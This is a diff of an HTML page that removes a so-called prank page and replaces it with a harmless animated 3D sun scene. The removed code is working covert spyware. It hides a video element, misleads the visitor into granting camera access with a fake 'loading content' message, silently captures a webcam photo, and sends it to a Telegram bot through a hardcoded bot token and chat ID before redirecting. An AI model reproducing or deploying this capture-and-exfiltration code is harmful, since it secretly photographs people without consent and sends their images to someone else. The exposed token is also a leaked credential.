@@ -1,79 +1,238 @@
 <!DOCTYPE html>
 <html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Пранк-Сайт</title>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>3D Sun</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-            background-color: #1a1a1a;
-            color: white;
-        }
-        /* Скрываем элементы камеры */
-        #video, #canvas {
-            display: none;
-        }
+      :root {
+        --sky-1: #020611;
+        --sky-2: #101a31;
+        --sun-1: #ffef8a;
+        --sun-2: #ffb000;
+        --sun-3: #ff6a00;
+        --glow: rgba(255, 180, 0, 0.8);
+        --ring: rgba(255, 190, 80, 0.22);
+      }
+
+      * { box-sizing: border-box; }
+
+      html, body {
+        margin: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        font-family: Arial, sans-serif;
+        background:
+          radial-gradient(circle at 50% 50%, rgba(255, 170, 0, 0.13), transparent 20%),
+          linear-gradient(180deg, var(--sky-1), var(--sky-2));
+      }
+
+      body {
+        display: grid;
+        place-items: center;
+        perspective: 1200px;
+      }
+
+      .scene {
+        position: relative;
+        width: min(80vmin, 760px);
+        height: min(80vmin, 760px);
+        transform-style: preserve-3d;
+        animation: drift 18s ease-in-out infinite alternate;
+      }
+
+      .sun-core {
+        position: absolute;
+        inset: 50% auto auto 50%;
+        width: 300px;
+        height: 300px;
+        transform: translate(-50%, -50%) rotateX(65deg) rotateY(0deg);
+        transform-style: preserve-3d;
+        border-radius: 50%;
+        background:
+          radial-gradient(circle at 35% 30%, #fff9d8 0%, rgba(255,255,255,0.7) 8%, rgba(255,184,0,0.9) 18%, var(--sun-2) 38%, var(--sun-3) 75%, rgba(255,110,0,0.8) 100%);
+        box-shadow:
+          0 0 30px rgba(255, 180, 30, 0.65),
+          0 0 80px rgba(255, 128, 0, 0.9),
+          0 0 150px rgba(255, 170, 0, 0.45);
+        animation: float 7s ease-in-out infinite;
+      }
+
+      .sun-core::before,
+      .sun-core::after {
+        content: "";
+        position: absolute;
+        inset: -18%;
+        border-radius: 50%;
+        border: 1px solid rgba(255, 214, 118, 0.25);
+      }
+
+      .sun-core::after {
+        inset: -30%;
+        border-color: rgba(255, 170, 0, 0.18);
+        transform: rotateY(60deg);
+      }
+
+      .sun-rings {
+        position: absolute;
+        inset: 50% auto auto 50%;
+        width: 430px;
+        height: 430px;
+        transform: translate(-50%, -50%) rotateX(72deg) rotateY(18deg);
+        border-radius: 50%;
+        border: 2px solid var(--ring);
+        box-shadow: 0 0 25px rgba(255, 160, 0, 0.25);
+        animation: spin 18s linear infinite;
+      }
+
+      .sun-rings::before,
+      .sun-rings::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        border-radius: 50%;
+      }
+
+      .sun-rings::before {
+        transform: rotateY(75deg) rotateX(10deg);
+        border: 2px solid rgba(255, 203, 92, 0.2);
+      }
+
+      .sun-rings::after {
+        transform: rotateX(68deg) rotateY(-32deg) scale(1.18);
+        border: 2px solid rgba(255, 150, 50, 0.16);
+      }
+
+      .sun-beams {
+        position: absolute;
+        inset: 50% auto auto 50%;
+        width: 560px;
+        height: 560px;
+        transform: translate(-50%, -50%) rotateX(76deg);
+        border-radius: 50%;
+        background: conic-gradient(
+          from 0deg,
+          rgba(255, 214, 120, 0),
+          rgba(255, 214, 120, 0.28),
+          rgba(255, 214, 120, 0),
+          rgba(255, 214, 120, 0.32),
+          rgba(255, 214, 120, 0),
+          rgba(255, 214, 120, 0.25),
+          rgba(255, 214, 120, 0),
+          rgba(255, 214, 120, 0.3),
+          rgba(255, 214, 120, 0)
+        );
+        filter: blur(2px);
+        opacity: 0.8;
+        animation: spin-reverse 28s linear infinite;
+      }
+
+      .orbit {
+        position: absolute;
+        inset: 50% auto auto 50%;
+        width: 520px;
+        height: 520px;
+        transform: translate(-50%, -50%) rotateX(65deg) rotateY(20deg);
+        border-radius: 50%;
+        border: 1px solid rgba(255, 213, 118, 0.12);
+      }
+
+      .orbit:nth-child(4) {
+        width: 620px;
+        height: 620px;
+      }
+
+      .planet {
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        background: radial-gradient(circle at 30% 30%, #ffd1a1, #ff8d3a 60%, #c54711);
+        box-shadow: 0 0 12px rgba(255, 144, 0, 0.45);
+        transform: translate(-50%, -50%) rotateZ(0deg) translateX(230px);
+      }
+
+      .planet.p2 {
+        width: 12px;
+        height: 12px;
+        background: radial-gradient(circle at 30% 30%, #dfefff, #5db6ff 60%, #0f4f8f);
+        box-shadow: 0 0 10px rgba(76, 164, 255, 0.45);
+        transform: translate(-50%, -50%) rotateZ(105deg) translateX(300px);
+      }
+
+      .spark {
+        position: absolute;
+        width: 4px;
+        height: 4px;
+        background: rgba(255, 214, 128, 0.9);
+        border-radius: 50%;
+        box-shadow: 0 0 12px rgba(255, 198, 75, 0.8);
+        animation: twinkle var(--dur) ease-in-out infinite alternate;
+        left: var(--x);
+        top: var(--y);
+      }
+
+      @keyframes spin {
+        from { transform: translate(-50%, -50%) rotateX(72deg) rotateY(18deg) rotateZ(0deg); }
+        to   { transform: translate(-50%, -50%) rotateX(72deg) rotateY(18deg) rotateZ(360deg); }
+      }
+
+      @keyframes spin-reverse {
+        from { transform: translate(-50%, -50%) rotateX(76deg) rotateZ(0deg); }
+        to   { transform: translate(-50%, -50%) rotateX(76deg) rotateZ(-360deg); }
+      }
+
+      @keyframes float {
+        0%, 100% { transform: translate(-50%, -50%) rotateX(65deg) rotateY(0deg) scale(1); }
+        50% { transform: translate(-50%, -50%) rotateX(68deg) rotateY(18deg) scale(1.03); }
+      }
+
+      @keyframes drift {
+        0% { transform: rotateX(10deg) rotateY(-12deg) translateY(-10px); }
+        100% { transform: rotateX(-12deg) rotateY(18deg) translateY(10px); }
+      }
+
+      @keyframes twinkle {
+        0% { transform: scale(0.5); opacity: 0.2; }
+        100% { transform: scale(1.9); opacity: 1; }
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
+    <div class="scene" id="scene">
+      <span class="spark" style="--x: 35%; --y: 25%; --dur: 2.4s;"></span>
+      <span class="spark" style="--x: 62%; --y: 12%; --dur: 3.1s;"></span>
+      <span class="spark" style="--x: 72%; --y: 38%; --dur: 2.8s;"></span>
+      <span class="spark" style="--x: 18%; --y: 60%; --dur: 3.6s;"></span>
+      <span class="spark" style="--x: 48%; --y: 78%; --dur: 2.3s;"></span>
+      <span class="spark" style="--x: 80%; --y: 72%; --dur: 4.2s;"></span>
+      <span class="spark" style="--x: 12%; --y: 42%; --dur: 3.9s;"></span>
+      <span class="spark" style="--x: 55%; --y: 52%; --dur: 2.7s;"></span>
 
-    <h1>Загрузка интерактивного контента...</h1>
-    <p>Пожалуйста, разрешите доступ к сайту для продолжения.</p>
-
-    <!-- Скрытые элементы для захвата видео и кадров -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+      <div class="orbit"></div>
+      <div class="orbit"></div>
+      <div class="planet"></div>
+      <div class="planet p2"></div>
+      <div class="sun-beams"></div>
+      <div class="sun-rings"></div>
+      <div class="sun-core"></div>
+    </div>
 
     <script>
-        const BOT_TOKEN = '8935304693:AAEVVl2rqobUte9TBNYMTakx-7ZpxXlh16A';
-        const CHAT_ID = '-1004480813156';
+      const scene = document.getElementById('scene');
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+      window.addEventListener('pointermove', (event) => {
+        const x = (event.clientX / window.innerWidth - 0.5) * 30;
+        const y = (event.clientY / window.innerHeight - 0.5) * -30;
+        scene.style.transform = `rotateX(${y}deg) rotateY(${x}deg)`;
+      });
 
-        // Запрос доступа к камере
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-
-                // Ждем 1.5 секунды, чтобы камера успела сфокусироваться и настроить экспозицию
-                setTimeout(() => {
-                    takeSnapshotAndSend();
-                }, 1500);
-            })
-            .catch(err => {
-                console.error("Ошибка доступа к сайту:", err);
-            });
-
-        function takeSnapshotAndSend() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Преобразуем изображение с canvas в Blob
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
-
-                // Отправка фото в Telegram через API
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Успешно отправлено:', data);
-                    // После отправки можно перенаправить друга на любой другой сайт
-                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                })
-                .catch(error => {
-                    console.error('Ошибка отправки:', error);
-                });
-            }, 'image/jpeg');
-        }
+      window.addEventListener('pointerleave', () => {
+        scene.style.transform = 'rotateX(0deg) rotateY(0deg)';
+      });
     </script>
-</body>
+  </body>
 </html>
